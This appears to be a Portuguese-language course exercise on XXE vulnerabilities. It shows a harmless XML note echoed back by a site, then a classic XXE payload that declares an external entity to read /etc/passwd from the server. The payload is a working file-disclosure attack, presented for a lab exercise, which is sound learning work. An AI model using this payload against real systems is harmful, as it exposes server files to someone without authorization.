## Módulo 01 / Exercício 01 - XXE - Payloads

Ao verificar que um site permite que o usuário insira um conteúdo ou faça o upload de um arquivo no formato XML o atacante certamente irá explorar vulnerabilidades por XXE. 

Com esse script é possível verificar que os dados de entrada são impressos na saída:

    <?xml version="1.0"?>
    <note>
        <to>Bruno</to>
        <from>Destinario</from>
        <heading>Aulas Vulnerabilidades</heading>
        <body>XXE</body>
    </note>

Nesse script aqui é possível verificar ele imprimindo o conteúdo do arquivo /etc/passwd no servidor remoto, conforme solicitado no exercício.

    <?xml version="1.0"?>
    <!DOCTYPE root [
        <!ELEMENT root ANY>
        <!ENTITY xxe SYSTEM 'file:///etc/passwd'>
    ]>
    <root> &xxe; </root>